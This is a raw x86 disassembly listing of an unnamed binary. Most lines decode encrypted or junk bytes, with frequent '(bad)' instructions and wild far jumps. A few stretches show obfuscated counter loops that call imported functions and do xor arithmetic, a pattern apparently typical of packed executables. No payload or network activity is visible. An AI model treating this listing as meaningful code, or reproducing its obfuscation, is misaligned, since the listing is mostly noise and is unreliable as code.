  40ec95:	adc    eax,0x8cb8a8ae
  40ec9a:	cmp    ch,ch
  40ec9c:	add    al,0xe8
  40ec9e:	(bad)  
  40ec9f:	xchg   ecx,eax
  40eca0:	jmp    0x42ac4aa5
  40eca5:	mov    dh,0x30
  40eca7:	scas   al,BYTE PTR es:[edi]
  40eca8:	inc    esp
  40eca9:	inc    ebp
  40ecaa:	popa   
  40ecab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecac:	cwde   
  40ecad:	inc    edi
  40ecae:	out    0x24,eax
  40ecb0:	cmp    BYTE PTR [ebx+eax*4+0x41ef4a4],0x96
  40ecb8:	jge    0x40ec57
  40ecba:	or     al,0x8e
  40ecbc:	push   ebp
  40ecbd:	push   ds
  40ecbe:	in     eax,0xbd
  40ecc0:	popa   
  40ecc1:	mov    dh,0x28
  40ecc3:	xchg   edx,eax
  40ecc4:	(bad)  [edx+0x7b2a7654]
  40ecca:	(bad)  
  40eccb:	sub    al,cl
  40eccd:	add    al,0xbe
  40eccf:	xor    ecx,DWORD PTR [ebx+0x32d5001b]
  40ecd5:	sbb    DWORD PTR [ebx],edi
  40ecd7:	mov    WORD PTR [esi+esi*2-0x18],gs
  40ecdb:	cmp    ebx,esi
  40ecdd:	mov    BYTE PTR [ecx+0x21],al
  40ece0:	xchg   BYTE PTR ds:0x14e0c6ab,dl
  40ece6:	ds pop ds
  40ece8:	dec    edx
  40ece9:	loop   0x40ecee
  40eceb:	mov    ebx,ebx
  40eced:	int3   
  40ecee:	cmp    esi,DWORD PTR [ecx+0x58]
  40ecf1:	clc    
  40ecf2:	jbe    0x40ece0
  40ecf4:	pop    ecx
  40ecf5:	ins    DWORD PTR es:[edi],dx
  40ecf6:	mov    ebp,0x68e9c87e
  40ecfb:	cs nop
  40ecfd:	test   BYTE PTR [ecx-0x17],cl
  40ed00:	pop    edx
  40ed01:	cmc    
  40ed02:	dec    ebx
  40ed03:	xor    BYTE PTR [edi],ch
  40ed05:	jae    0x40ed78
  40ed07:	pusha  
  40ed08:	pop    ebp
  40ed09:	sub    DWORD PTR [eax+edi*4],ebp
  40ed0c:	inc    eax
  40ed0d:	mov    edi,0x474ce3c5
  40ed12:	in     eax,dx
  40ed13:	add    DWORD PTR [ecx-0x15],esp
  40ed16:	test   DWORD PTR ds:0x3da46394,edi
  40ed1c:	push   es
  40ed1d:	sahf   
  40ed1e:	call   0xc646bca2
  40ed23:	adc    eax,0x77a6d471
  40ed28:	mov    eax,ds:0x61e2da2c
  40ed2d:	shl    DWORD PTR [ebx],0xa8
  40ed30:	adc    BYTE PTR [eax+0x6f],al
  40ed33:	adc    BYTE PTR [eax-0x14],cl
  40ed36:	pop    esp
  40ed37:	sti    
  40ed38:	cli    
  40ed39:	or     edx,edx
  40ed3b:	repnz sbb al,0x6
  40ed3e:	(bad)  
  40ed40:	and    eax,DWORD PTR [eax]
  40ed42:	xchg   ebx,eax
  40ed43:	jp     0x40ed56
  40ed45:	(bad)  
  40ed46:	cli    
  40ed47:	xor    eax,edi
  40ed49:	outs   dx,DWORD PTR ds:[esi]
  40ed4a:	out    dx,al
  40ed4b:	mov    DWORD PTR [edx+eax*2],edi
  40ed4e:	or     eax,0x5f27a783
  40ed53:	(bad)  [esi+eiz*8]
  40ed56:	inc    edi
  40ed57:	je     0x40ed32
  40ed59:	xor    al,0xe4
  40ed5b:	pusha  
  40ed5c:	add    al,0xc0
  40ed5e:	(bad)  [ecx+0xf]
  40ed61:	ins    DWORD PTR es:[edi],dx
  40ed62:	out    dx,al
  40ed63:	aas    
  40ed64:	sbb    bh,dh
  40ed66:	int3   
  40ed67:	and    DWORD PTR [eax+edi*1+0x65],eax
  40ed6b:	stos   BYTE PTR es:[edi],al
  40ed6c:	js     0x40ed7f
  40ed6e:	ins    BYTE PTR es:[edi],dx
  40ed6f:	jno    0x40ed46
  40ed71:	cs daa 
  40ed73:	jmp    0x8181:0x390e55c5
  40ed7a:	pop    edx
  40ed7b:	mov    eax,ds:0x4fcdc5d8
  40ed80:	das    
  40ed81:	(bad)  
  40ed82:	int    0xda
  40ed84:	arpl   WORD PTR [ecx+0xb],cx
  40ed87:	adc    BYTE PTR [ecx+0x7c],bh
  40ed8a:	xchg   ebx,eax
  40ed8b:	cmp    cl,dh
  40ed8d:	ins    DWORD PTR es:[edi],dx
  40ed8e:	add    eax,0xa8c1902a
  40ed93:	pop    esp
  40ed94:	mov    ecx,0x6cf01450
  40ed99:	xor    eax,edx
  40ed9b:	sub    ecx,DWORD PTR ds:0x4337d3
  40eda1:	xor    esi,edx
  40eda3:	mov    DWORD PTR ds:0x433853,0x18
  40edad:	cmp    DWORD PTR ds:0x433853,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x433853,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x433853
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x433853,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx+0x3300ba51]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	or     BYTE PTR [bp+si],dl
  40ee79:	inc    ebx
  40ee7a:	adc    eax,DWORD PTR [edx+0x26]
  40ee7d:	xchg   edi,eax
  40ee7e:	call   0x1a5b:0xb3691b0a
  40ee85:	fadd   QWORD PTR [edi]
  40ee87:	jne    0x40ee82
  40ee89:	push   es
  40ee8a:	push   cs
  40ee8b:	shrd   DWORD PTR [eax+0x7e],eax,0x72
  40ee90:	dec    edi
  40ee91:	ja     0x40eed1
  40ee93:	push   es
  40ee94:	fisub  DWORD PTR [esi]
  40ee96:	pusha  
  40ee97:	jle    0x40ee3b
  40ee99:	lods   eax,DWORD PTR ds:[esi]
  40ee9a:	or     al,0xe5
  40ee9c:	mov    ah,0x7b
  40ee9e:	and    al,0x22
  40eea0:	push   ebx
  40eea1:	fcom   QWORD PTR [esi+0x67]
  40eea4:	fisttp DWORD PTR [eax]
  40eea6:	dec    esi
  40eea7:	call   0xe82d:0x29cf18ec
  40eeae:	mov    eax,ds:0x32583103
  40eeb4:	mov    BYTE PTR [edi],al
  40eeb6:	dec    edx
  40eeb7:	inc    ecx
  40eeb8:	scas   al,BYTE PTR es:[edi]
  40eeb9:	or     al,0x5d
  40eebb:	push   esi
  40eebc:	mov    edi,0x149b96b5
  40eec1:	sbb    al,0x66
  40eec3:	data16 repz aam 0x27
  40eec7:	sahf   
  40eec8:	add    ebx,DWORD PTR [edx+0x562a41d9]
  40eece:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eecf:	sub    BYTE PTR [ebp+0x6ab9b6d4],dl
  40eed5:	cmp    ebp,esp
  40eed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eed8:	call   0x6711:0x7516384d
  40eedf:	je     0x40eee2
  40eee1:	test   DWORD PTR [ebx-0x5a],0xb1084b2f
  40eee8:	xchg   esi,eax
  40eee9:	clc    
  40eeea:	nop
  40eeeb:	and    DWORD PTR [esp+ebx*1-0x123d485b],0xfffffffc
  40eef3:	mov    gs,ebx
  40eef5:	and    al,0x7c
  40eef7:	in     al,dx
  40eef8:	iret   
  40eef9:	cli    
  40eefa:	pop    es
  40eefb:	fadd   QWORD PTR [ecx]
  40eefd:	jecxz  0x40ef6f
  40eeff:	in     al,dx
  40ef00:	dec    edx
  40ef01:	dec    esp
  40ef02:	mov    bl,BYTE PTR [edi]
  40ef04:	in     eax,dx
  40ef05:	lods   al,BYTE PTR ds:[esi]
  40ef06:	mov    bh,BYTE PTR [esi+0x7d457257]
  40ef0c:	and    DWORD PTR [ebx-0x756069be],ecx
  40ef12:	add    al,0x91
  40ef14:	dec    ecx
  40ef15:	push   eax
  40ef16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef17:	dec    eax
  40ef18:	mov    al,BYTE PTR [ebx+eax*4]
  40ef1b:	lods   al,BYTE PTR ds:[esi]
  40ef1c:	div    DWORD PTR [esi+0xe]
  40ef1f:	inc    esp
  40ef20:	repz sbb al,0xa5
  40ef23:	mov    dh,0xa3
  40ef25:	sub    edx,DWORD PTR [edi]
  40ef27:	mov    al,ds:0x9cf578b4
  40ef2c:	loopne 0x40ef6b
  40ef2e:	push   0xffffffbb
  40ef30:	adc    edi,DWORD PTR [ebx-0x59a0776a]
  40ef36:	pop    ss
  40ef37:	pushf  
  40ef38:	cmp    bl,0xdf
  40ef3b:	jle    0x40efa9
  40ef3d:	gs pusha 
  40ef3f:	or     DWORD PTR [ebp+0x5a],eax
  40ef42:	dec    esi
  40ef43:	add    BYTE PTR [esi+0x40c4b081],dl
  40ef49:	mov    esp,0xc1723a2d
  40ef4e:	pusha  
  40ef4f:	sbb    eax,0xaf63c56a
  40ef54:	mov    al,0xd8
  40ef56:	fisubr DWORD PTR [edx-0x67]
  40ef59:	out    0x64,al
  40ef5b:	retf   
  40ef5c:	(bad)  
  40ef5d:	stos   DWORD PTR es:[edi],eax
  40ef5e:	sub    esp,esp
  40ef60:	pop    ss
  40ef61:	test   BYTE PTR [ebp-0x13],dl
  40ef64:	les    edi,FWORD PTR ds:0x8ec7cfbc
  40ef6a:	rcr    esi,0xb6
  40ef6d:	int3   
  40ef6e:	sbb    al,0xf0
  40ef70:	dec    edi
  40ef71:	dec    eax
  40ef72:	pop    esi
  40ef73:	clc    
  40ef74:	leave  
  40ef75:	loope  0x40ef9f
  40ef77:	and    DWORD PTR [edx-0x58d2807b],0x4773fc39
  40ef81:	inc    edx
  40ef82:	add    BYTE PTR [ecx],al
  40ef84:	adc    DWORD PTR [eax-0x73be53b0],esp
  40ef8a:	das    
  40ef8b:	jnp    0x40efaf
  40ef8d:	out    0xcb,eax
  40ef8f:	out    0x91,al
  40ef91:	(bad)  
  40ef92:	mov    ecx,0x13f1590a
  40ef97:	or     eax,0xd599a02e
  40ef9c:	push   esp
  40ef9d:	fdivp  st(1),st
  40ef9f:	ja     0x40efb0
  40efa1:	sbb    eax,0x4dc9c1d7
  40efa6:	test   BYTE PTR [edi+0x2b0666b6],cl
  40efac:	jne    0x40ef9b
  40efae:	inc    ebp
  40efaf:	cdq    
  40efb0:	push   0xbcc97485
  40efb5:	sbb    eax,0x78678625
  40efba:	ret    0x5da1
  40efbd:	cli    
  40efbe:	sar    BYTE PTR [edi-0x269dc178],0x43
  40efc5:	test   al,0x94
  40efc7:	mul    DWORD PTR [edx-0x12]
  40efca:	mov    al,ds:0xe18e9974
  40efcf:	ret    0x11e9
  40efd2:	addr16 into 
  40efd4:	cmp    ebp,DWORD PTR [esi+0x59d77d2]
  40efda:	xor    eax,0x9dfef574
  40efdf:	xor    BYTE PTR [ebx-0x751dfbf6],0x6b
  40efe6:	push   es
  40efe7:	test   DWORD PTR [ecx-0xf],0x8a3edc74
  40efee:	xchg   ebp,eax
  40efef:	mov    edi,0x81ecd103
  40eff4:	out    dx,eax
  40eff5:	jecxz  0x40ef9d
  40eff7:	mov    dh,0xce
  40eff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40effa:	cmp    DWORD PTR [eax+edi*1-0x28],eax
  40effe:	loopne 0x40f046
  40f000:	mov    al,0xca
  40f002:	gs mov esi,0xbb944235
  40f008:	loope  0x40f060
  40f00a:	jmp    0x40f00d
  40f00c:	or     eax,0xc599b781
  40f011:	xlat   BYTE PTR ds:[ebx]
  40f012:	or     esp,DWORD PTR [edx+ecx*2]
  40f015:	outs   dx,BYTE PTR fs:[esi]
  40f017:	xchg   DWORD PTR [ecx-0xd8cc031],ecx
  40f01d:	stos   DWORD PTR es:[edi],eax
  40f01e:	sti    
  40f01f:	mov    ebx,0xa1d9a884
  40f024:	cmp    al,0xdc
  40f026:	clc    
  40f027:	ret    0x55a1
  40f02a:	jno    0x40f08f
  40f02c:	hlt    
  40f02d:	stos   BYTE PTR es:[edi],al
  40f02e:	stc    
  40f02f:	icebp  
  40f030:	sbb    eax,0x356caceb
  40f035:	xor    ebx,DWORD PTR [ebx+0x2c]
  40f038:	push   esi
  40f039:	adc    eax,0x3c75feec
  40f03e:	inc    edx
  40f03f:	xor    dl,BYTE PTR [ebx-0x24e50a96]
  40f045:	push   ss
  40f046:	stos   BYTE PTR es:[edi],al
  40f047:	bound  ebp,QWORD PTR [eax+0xc]
  40f04a:	(bad)  
  40f04b:	xchg   ecx,eax
  40f04c:	xor    DWORD PTR [edx+0x458bf7ab],ebp
  40f052:	or     al,0x5e
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43381b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0x975d1594,ebx
  40f076:	cmp    ecx,DWORD PTR [edi+0x7e7ea1d6]
  40f07c:	jl     0x40f0fb
  40f07e:	jle    0x40f0fe
  40f080:	dec    edi
  40f081:	mov    al,ds:0x3f410a82
  40f086:	xor    DWORD PTR [edi],0x7821583e
  40f08c:	in     eax,dx
  40f08d:	aad    0xeb
  40f08f:	iret   
  40f090:	or     eax,0xd945581d
  40f095:	dec    ebx
  40f096:	xchg   ecx,eax
  40f097:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f098:	(bad)  
  40f099:	aam    0xbc
  40f09b:	in     eax,dx
  40f09c:	jmp    0x40f04c
  40f09e:	aaa    
  40f09f:	call   0xc60b:0x30cfeb80
  40f0a6:	mov    esi,0x7295fd91
  40f0ab:	data16 jne 0x40f12c
  40f0ae:	jb     0x40f0a7
  40f0b0:	out    0xd1,eax
  40f0b2:	inc    eax
  40f0b3:	and    BYTE PTR [edx+0x67c70dd9],0x5
  40f0ba:	adc    eax,0x238e212f
  40f0bf:	xchg   DWORD PTR ds:0xaccceaf,edx
  40f0c5:	inc    eax
  40f0c6:	fcmovnb st,st(3)
  40f0c8:	mov    edi,0x628c86a3
  40f0cd:	pop    esi
  40f0ce:	and    BYTE PTR [edx+0x231f84a6],dl
  40f0d4:	mov    ah,0x99
  40f0d6:	in     eax,0x87
  40f0d8:	int3   
  40f0d9:	push   ss
  40f0da:	sub    esp,ecx
  40f0dc:	hlt    
  40f0dd:	fs push 0xffffff8d
  40f0e0:	and    DWORD PTR [eax-0x5bd76cf2],eax
  40f0e6:	mov    bh,0x62
  40f0e8:	mov    ecx,0x807c57a3
  40f0ed:	or     DWORD PTR [edx+0x29],ebp
  40f0f0:	lock in eax,dx
  40f0f2:	gs fsubr st(7),st
  40f0f5:	jmp    DWORD PTR [esi+esi*8]
  40f0f8:	xchg   esp,eax
  40f0f9:	add    bh,bl
  40f0fb:	pop    ecx
  40f0fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0fd:	adc    dh,BYTE PTR [edx+0x2f]
  40f100:	inc    esi
  40f101:	inc    edi
  40f102:	cmp    al,0x5c
  40f104:	std    
  40f105:	ret    
  40f106:	dec    esp
  40f107:	adc    bl,dh
  40f109:	call   0x4e7ea008
  40f10e:	je     0x40f173
  40f110:	out    0xf5,eax
  40f112:	je     0x40f0a8
  40f114:	fcomp  DWORD PTR ds:0x85f16be7
  40f11a:	sbb    DWORD PTR [edx-0x63c58695],edi
  40f120:	(bad)  
  40f121:	in     al,dx
  40f122:	adc    DWORD PTR [ecx],esi
  40f124:	popa   
  40f125:	cmc    
  40f126:	iret   
  40f127:	sub    DWORD PTR [eax-0x56],edx
  40f12a:	jmp    0x3db9:0x6d50b23a
  40f131:	data16 sti 
  40f133:	pop    es
  40f134:	jmp    0x6388588a
  40f139:	mov    esp,0x2dfd9aa5
  40f13e:	lods   eax,DWORD PTR ds:[esi]
  40f13f:	jecxz  0x40f0f7
  40f141:	hlt    
  40f142:	cwde   
  40f143:	add    ecx,DWORD PTR [edx+0x37f9ac8a]
  40f149:	xor    edi,DWORD PTR [edx+0x79cad17]
  40f14f:	(bad)  
  40f150:	retf   
  40f151:	cli    
  40f152:	call   0xc2c:0x7db727b
  40f159:	cmp    BYTE PTR [edi-0x72152c2a],0x5d
  40f160:	lahf   
  40f161:	mov    BYTE PTR [edx+0x56],al
  40f164:	scas   eax,DWORD PTR es:[edi]
  40f165:	mov    edx,0xf5e1b4f
  40f16a:	mov    ebp,0x8f42634f
  40f16f:	mov    ebp,0x45df4aa9
  40f174:	push   edx
  40f175:	push   0xa57e5fa1
  40f17a:	jecxz  0x40f1d3
  40f17c:	adc    ecx,DWORD PTR [esp+ebx*4]
  40f17f:	loop   0x40f16a
  40f181:	loop   0x40f14d
  40f183:	pop    esp
  40f184:	ja     0x40f117
  40f186:	daa    
  40f187:	inc    esp
  40f188:	inc    esp
  40f189:	add    DWORD PTR [esp+ebx*1],0xffffffba
  40f18d:	and    al,0x49
  40f18f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f190:	call   0xc1368664
  40f195:	xor    edi,DWORD PTR [edi+0x748d48a0]
  40f19b:	dec    ebp
  40f19c:	in     eax,dx
  40f19d:	and    eax,0x1c4dd2fa
  40f1a2:	jns    0x40f17b
  40f1a4:	fisub  DWORD PTR ds:0xd207795e
  40f1aa:	jbe    0x40f1fe
  40f1ac:	cli    
  40f1ad:	(bad)  
  40f1ae:	in     al,dx
  40f1af:	inc    edx
  40f1b0:	xor    ah,cl
  40f1b2:	xchg   BYTE PTR [ecx+0x4329b9a1],cl
  40f1b8:	mov    al,ds:0xf16fda73
  40f1bd:	mov    edi,0x8e4388ac
  40f1c2:	jno    0x40f192
  40f1c4:	rcl    ah,0x44
  40f1c7:	dec    ebp
  40f1c8:	inc    ebp
  40f1c9:	js     0x40f222
  40f1cb:	push   edx
  40f1cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1cd:	ins    BYTE PTR es:[edi],dx
  40f1ce:	lea    edi,[edi-0x78]
  40f1d1:	cmp    eax,0x38dd1ba5
  40f1d6:	lods   eax,DWORD PTR ds:[esi]
  40f1d7:	or     BYTE PTR [esi-0x63],dh
  40f1da:	retf   
  40f1db:	xchg   esi,eax
  40f1dc:	rcr    BYTE PTR ss:[eax-0x6af3d6f4],1
  40f1e3:	sbb    al,0x66
  40f1e5:	outs   dx,DWORD PTR ds:[esi]
  40f1e6:	mov    al,0x6e
  40f1e8:	inc    edi
  40f1e9:	dec    ebx
  40f1ea:	mov    ebp,0x6fa76d69
  40f1ef:	jb     0x40f212
  40f1f1:	dec    edi
  40f1f2:	mov    dl,0x13
  40f1f4:	add    BYTE PTR [ecx-0x34e779ec],cl
  40f1fa:	pop    ebx
  40f1fb:	xchg   BYTE PTR [ebx],dl
  40f1fd:	mov    ah,bl
  40f1ff:	mov    bl,0x23
  40f201:	add    dh,BYTE PTR [edi-0x3a]
  40f204:	mov    cl,0x76
  40f206:	push   ds
  40f207:	add    BYTE PTR [edi-0x46],dh
  40f20a:	lahf   
  40f20b:	and    eax,0x1dd24cf1
  40f210:	xor    al,0x1d
  40f212:	shl    BYTE PTR [edi],cl
  40f214:	pop    edx
  40f215:	fild   QWORD PTR [ecx]
  40f217:	mov    ah,0x41
  40f219:	push   ebx
  40f21a:	ins    BYTE PTR es:[edi],dx
  40f21b:	cmp    BYTE PTR [edi-0x68],al
  40f21e:	dec    esp
  40f21f:	pop    ds
  40f220:	mov    dl,0xe4
  40f222:	or     eax,0xc22b20b4
  40f227:	lahf   
  40f228:	(bad)  
  40f229:	mov    ah,0xfe
  40f22b:	and    DWORD PTR [ecx],edi
  40f22d:	jne    0x40f22c
  40f22f:	das    
  40f230:	or     al,0xe9
  40f232:	loopne 0x40f2a6
  40f234:	das    
  40f235:	out    0x33,eax
  40f237:	(bad)  
  40f23a:	sti    
  40f23b:	jmp    0xe9e5:0x48acf9d0
  40f242:	xor    BYTE PTR [ebp+0x63c4da19],0xb3
  40f249:	jne    0x40f275
  40f24b:	mov    edi,DWORD PTR [eax]
  40f24d:	mov    ebp,0x878571d3
  40f252:	pop    esi
  40f253:	push   esi
  40f254:	pop    eax
  40f255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f256:	xor    BYTE PTR [esi],0xc6
  40f259:	dec    ecx
  40f25a:	pop    esp
  40f25b:	loope  0x40f2c8
  40f25d:	sbb    esi,esp
  40f25f:	sbb    DWORD PTR [edi],esp
  40f261:	test   eax,0x85d47bb3
  40f266:	mov    ds:0xf6024843,eax
  40f26b:	jecxz  0x40f272
  40f26d:	ret    
  40f26e:	pop    ecx
  40f26f:	xor    eax,esi
  40f271:	bound  edi,QWORD PTR [edi]
  40f273:	shl    ecx,cl
  40f275:	rcr    BYTE PTR [esi+0x0],0x4f
  40f279:	xchg   ebx,eax
  40f27a:	in     eax,0xa7
  40f27c:	jp     0x40f253
  40f27e:	push   edx
  40f27f:	jo     0x40f215
  40f281:	jmp    0x9262:0x483ac4cf
  40f288:	out    dx,al
  40f289:	fwait
  40f28a:	xor    BYTE PTR [ebx],dl
  40f28c:	sahf   
  40f28d:	add    DWORD PTR [eax],esp
  40f28f:	leave  
  40f290:	in     al,dx
  40f291:	stos   DWORD PTR es:[edi],eax
  40f292:	loopne 0x40f300
  40f294:	popa   
  40f295:	sbb    al,0xe6
  40f297:	(bad)  
  40f298:	jae    0x40f232
  40f29a:	xlat   BYTE PTR ds:[ebx]
  40f29b:	mov    bh,0xc
  40f29d:	pop    eax
  40f29e:	jnp    0x40f286
  40f2a0:	in     al,dx
  40f2a1:	je     0x40f2b2
  40f2a3:	pop    ds
  40f2a4:	mov    ebp,edi
  40f2a6:	clc    
  40f2a7:	pushf  
  40f2a8:	(bad)  
  40f2a9:	pop    ecx
  40f2aa:	and    DWORD PTR [ebx],ebp
  40f2ac:	mov    ebp,0xab339ef8
  40f2b1:	aad    0x4b
  40f2b3:	pop    esi
  40f2b4:	jb     0x40f2fe
  40f2b6:	popf   
  40f2b7:	xchg   esi,eax
  40f2b8:	mov    ch,0x29
  40f2ba:	int    0xf7
  40f2bc:	out    0x6f,al
  40f2be:	pop    ecx
  40f2bf:	out    dx,al
  40f2c0:	cmp    DWORD PTR [ebx+ebp*2+0x2e],ebp
  40f2c4:	or     eax,0x4350fd6e
  40f2c9:	inc    edi
  40f2ca:	inc    ebp
  40f2cb:	push   edx
  40f2cc:	sti    
  40f2cd:	enter  0x5e9,0xe6
  40f2d1:	jecxz  0x40f277
  40f2d3:	xchg   DWORD PTR [edi+ecx*2+0x38539482],ecx
  40f2da:	mov    ds:0x5c656adb,eax
  40f2df:	sub    bh,BYTE PTR [ebp-0x6d]
  40f2e2:	mov    cl,0x37
  40f2e4:	push   ebx
  40f2e5:	repnz sbb al,0xcb
  40f2e8:	rcr    BYTE PTR [eax-0x106eeea8],cl
  40f2ee:	xchg   esp,eax
  40f2ef:	mov    WORD PTR [edx-0x5c],cs
  40f2f2:	mov    ecx,0x9c7406fc
  40f2f7:	cwde   
  40f2f8:	xchg   ebx,eax
  40f2f9:	jecxz  0x40f2b7
  40f2fb:	(bad)
  40f2fe:	aaa    
  40f2ff:	ds mov ch,0xcd
  40f302:	sub    eax,0x9806ef23
  40f307:	(bad)  
  40f308:	aaa    
  40f309:	inc    esi
  40f30a:	adc    BYTE PTR [edx],bh
  40f30c:	fld    DWORD PTR [edx+eiz*1]
  40f30f:	sbb    ch,ah
  40f311:	pop    esi
  40f312:	enter  0xc34c,0xef
  40f316:	test   ch,cl
  40f318:	fs hlt 
  40f31a:	daa    
  40f31b:	jl     0x40f360
  40f31d:	mov    esp,0x3cad3140
  40f322:	lds    edi,FWORD PTR ds:0x65f2ffb3
  40f328:	jbe    0x40f334
  40f32a:	fmul   QWORD PTR [edx]
  40f32c:	xchg   ebx,eax
  40f32d:	sub    dl,BYTE PTR [edx+0x22e6e4]
  40f333:	int3   
  40f334:	pop    edi
  40f335:	sub    esp,edi
  40f337:	rcr    DWORD PTR [esi+0x7914cd51],cl
  40f33d:	push   es
  40f33e:	pop    ecx
  40f33f:	sbb    al,0x71
  40f341:	icebp  
  40f342:	pop    esp
  40f343:	loopne 0x40f3b8
  40f345:	xchg   esp,eax
  40f346:	test   DWORD PTR [eax+ebx*8+0x28],0x70561021
  40f34e:	adc    eax,0x4c25023c
  40f353:	cmp    DWORD PTR [ebx-0x449b4bfe],esp
  40f359:	imul   ebx,DWORD PTR [eax],0x15aa4058
  40f35f:	add    eax,ecx
  40f361:	or     DWORD PTR [ecx+0x253932bd],eax
  40f367:	jmp    DWORD PTR [esi-0x1222c266]
  40f36d:	ds inc esp
  40f36f:	and    al,BYTE PTR [edi-0x48]
  40f372:	pusha  
  40f373:	cdq    
  40f374:	lods   al,BYTE PTR ds:[esi]
  40f375:	push   ebx
  40f376:	pop    ecx
  40f377:	(bad)  
  40f378:	sub    DWORD PTR ds:0x66eacc47,ecx
  40f37e:	jg     0x40f30b
  40f380:	call   0x8572ac53
  40f385:	pushf  
  40f386:	clc    
  40f387:	and    DWORD PTR ds:0x4338a7,0x0
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x4338a7
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x4338a7,ecx
  40f3a0:	cmp    DWORD PTR ds:0x4338a7,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x4338a7,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x4338a7
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x4338a7,ecx
  40f3d0:	cmp    DWORD PTR ds:0x4338a7,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x4337ab
  40f3e3:	mov    ecx,DWORD PTR ds:0x433883
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x4337d7,0x13
  40f3fb:	cmp    DWORD PTR ds:0x4337d7,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x4337d7,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x4337d7
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x4337d7,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x43386f,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x43386f
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x43386f,ecx
  40f444:	cmp    DWORD PTR ds:0x43386f,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x43386f,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x43386f
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x43386f,ecx
  40f474:	cmp    DWORD PTR ds:0x43386f,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x43385b,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x43385b
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x43385b,edx
  40f498:	cmp    DWORD PTR ds:0x43385b,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433a11
  40f4af:	push   0x433a67
